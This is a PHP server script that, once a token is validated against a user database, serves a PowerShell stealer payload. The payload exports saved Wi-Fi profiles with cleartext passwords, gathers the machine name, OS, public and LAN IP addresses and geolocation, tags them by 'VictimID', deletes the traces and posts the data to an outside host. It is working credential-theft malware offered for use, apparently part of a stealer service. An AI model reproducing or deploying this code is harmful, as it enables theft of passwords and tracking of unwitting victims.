<?php
/* payload.php – returns the PowerShell payload for a given token */
require_once __DIR__ . '/db.php';

$token = $_GET['token'] ?? '';
if (empty($token)) {
    http_response_code(403);
    exit('Access Denied: Missing token.');
}

// Optional: verify the token belongs to a user
$stmt = $pdo->prepare('SELECT id FROM users WHERE token = ?');
$stmt->execute([$token]);
$user = $stmt->fetch();
if (!$user) {
    http_response_code(403);
    exit('Access Denied: Invalid token.');
}

// PowerShell payload – same as before, but token already injected via URL
$ps = <<<'PS'
$u='https://narain.udhees.com/upload.php?token=%TOKEN%';
$t=$env:TEMP;
netsh wlan export profile folder="$t" key=clear > $null;
$os=(Get-CimInstance Win32_OperatingSystem).Caption;
$victimId=$env:COMPUTERNAME;
try{$pub=(Invoke-WebRequest -UseBasicParsing 'https://api.ipify.org').Content}catch{$pub='(unknown)'};
$defaultRoute=Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue|Sort-Object RouteMetric|Select-Object -First 1;
if($defaultRoute){
    $ifIndex=$defaultRoute.InterfaceIndex;
    $lanObj=Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $ifIndex -ErrorAction SilentlyContinue |
            Where-Object{ $_.IPAddress -notlike '169.254*' -and $_.IPAddress -notlike '127.0.0.1'} |
            Select-Object -First 1;
}else{ $lanObj=$null };
if($lanObj){ $lan=$lanObj.IPAddress }else{ $lan='(unknown)' };

# optional geolocation – safely fails on machines without GPS
try{
    Add-Type -AssemblyName System.Device;
    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher;
    $GeoWatcher.Start();
    while(($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')){ Start-Sleep -Milliseconds 100 };
    if($GeoWatcher.Permission -ne 'Denied'){
        $loc=$GeoWatcher.Position.Location;
        if(-not $loc.IsUnknown){
            $alt=[string]$loc.Altitude; $lat=[string]$loc.Latitude; $lon=[string]$loc.Longitude;
        }else{ $alt='N/A'; $lat='N/A'; $lon='N/A' }
    }else{ $alt='N/A'; $lat='N/A'; $lon='N/A' }
    $GeoWatcher.Stop()
}catch{ $alt='N/A'; $lat='N/A'; $lon='N/A' };

$ts = (Get-Date -f 'yyyy-MM-dd HH:mm:ss');
$items = @();
Get-ChildItem "$t\Wi-Fi-*.xml" | ForEach-Object{
    $x = [xml](Get-Content $_.FullName);
    $s = $x.WLANProfile.SSIDConfig.SSID.name;
    $p = $x.WLANProfile.MSM.security.sharedKey.keyMaterial;
    $items += [pscustomobject]@{
        Time          = $ts;
        VictimID      = $victimId;
        SSID          = $s;
        Password      = if($p){ $p }else{ '' };
        VictimLANIP   = $lan;
        VictimOS      = $os;
        PublicIP      = $pub;
        LANExtra      = $alt;
        Latitude      = $lat;
        Longitude     = $lon;
        PacketSummary = ''
    };
    Remove-Item $_.FullName -ErrorAction SilentlyContinue
};
if(-not $items){
    $items = [pscustomobject]@{
        Time          = $ts;
        VictimID      = $victimId;
        SSID          = '(none)';
        Password      = '';
        VictimLANIP   = $lan;
        VictimOS      = $os;
        PublicIP      = $pub;
        LANExtra      = $alt;
        Latitude      = $lat;
        Longitude     = $lon;
        PacketSummary = ''
    };
};
$json = $items | ConvertTo-Json -Compress;
Invoke-WebRequest -UseBasicParsing -Uri $u -Method Post -Body $json -ContentType 'application/json';
exit
PS;

$ps = str_replace('%TOKEN%', $token, $ps);
header('Content-Type: text/plain; charset=utf-8');
echo $ps;
?>
